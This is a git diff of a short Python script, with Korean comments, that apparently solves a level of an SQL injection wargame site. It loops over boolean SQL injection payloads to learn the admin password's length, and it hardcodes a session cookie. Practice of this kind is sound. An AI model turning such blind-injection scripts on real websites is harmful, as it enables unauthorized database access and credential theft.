@@ -1,18 +1,28 @@
-import urllib.request 
+import urllib.request
 from urllib.parse import quote
 
-for i in range(1, 10):
-        url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
-        query = "'||length(pw)>{} -- ".format(i)
-        query = quote(query)
-        new_url = url + query
+# pw 길이 1~10 사이로 예측해서 반복시킴
+for i in range(1, 10, 1):
 
-        re = urllib.request.Request(new_url)
-        re.add_header("Cookie", "< My Cookie value >")
-        response = urllib.request.urlopen(re)
+    # pw의 길이 수를 바꿔주면서 새로운 url을 만듦
+    url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
+    query = "'||length(pw)>{}-- ".format(i)
+    query = quote(query)
+    new_url = url + query
 
-        if str(response.read()).find("Hello admin") != -1:
-            print("Found length!! => {}".format(i))
-        else:
-            print("{}".format(i))
+    # los에 로그인을 해야되서 urllib.request의 객체를 생성해 헤더를 추가해줌 
+    # 위에서 만든 새로운 url을 요청함
+    req = urllib.request.Request(new_url)
+    req.add_header("Cookie", "_ga=GA1.2.893628562.1594020923; PHPSESSID=hiie22frndk04nkgbhattrg6tg")
+
+    # 요청한 정보를 돌려받은 응답 저장
+    response = urllib.request.urlopen(req)
+
+    # 서버가 응답한 데이터를 받아들이고,
+    # 참(admin이 있는 경우)인 경우 admin이 출력된 숫자를 표시
+    if str(response.read()).find("Hello admin") != -1:
+        print("Find admin => {}".format(i))
+    else:
+        print("{}".format(i))
+
 print("Finish")
